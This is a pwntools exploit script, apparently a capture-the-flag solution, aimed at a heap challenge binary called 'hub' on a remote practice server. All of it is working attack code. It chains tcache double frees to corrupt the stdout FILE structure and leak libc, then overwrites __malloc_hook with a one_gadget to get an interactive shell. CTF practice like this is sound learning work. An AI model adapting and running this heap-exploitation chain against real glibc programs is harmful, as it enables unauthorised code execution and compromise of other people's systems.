from pwn import *
context.log_level = 'debug'

#p = process('./hub')
p = remote('node3.buuoj.cn',28892)

def sl(x):
	p.sendline(x)

def ru(x):
	p.recvuntil(x)

def sd(x):
	p.send(x)


def malloc(size):
	ru('>>')
	sl('1')
	ru('stay?\n')
	sl(str(size))

def free(index):
	ru('>>')
	sl('2')
	ru('want?\n')
	sl(str(index))

def write(data):
	ru('>>')
	sl('3')
	ru(' want?')
	sd(data)

def m2(size):
	sl('1')
	ru('stay?\n')
	sl(str(size))

def f2(index):
	sl('2')
	ru('want?\n')
	sl(str(index))

def w2(data):
	sl('3')
	ru(' want?')
	sd(data)

#change _IO_2_1_stdout_._flags
malloc(0x70)
malloc(0x70)
malloc(0x70)
free(-0x80)
free(-0x80)
malloc(0x70)
write(p64(0x602020))
malloc(0x70)
malloc(0x70)
malloc(0x70)
write(p64(0xfbad1887))

#change stdout -> _IO_write_base
malloc(0x10)
free(0)
free(0)
malloc(0x10)
write(p64(0x602020))
malloc(0x10)
malloc(0x10)
write('\x80')

#change _IO_write_base 1 bit -> '\x00', leak libc
m2(0x20)
f2(0)
f2(0)
m2(0x20)
w2(p64(0x602020))
m2(0x20)
m2(0x20)
m2(0x20)
w2('\x00')

ru('\x00'*8)
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
info('leak_addr : 0x%x'%leak_addr)
libc_base = leak_addr - 0x3ed8b0
info('leak_addr : 0x%x'%libc_base)
malloc_hook = libc_base + 0x3ebc30
one_gadget = libc_base + 0x10a38c

#change __malloc_hook -> one_gadget
m2(0x30)
f2(0)
f2(0)
m2(0x30)
w2(p64(malloc_hook))
m2(0x30)
m2(0x30)
w2(p64(one_gadget))

sl('1')
ru(' stay?\n')
sl('1')
#gdb.attach(p)

p.interactive()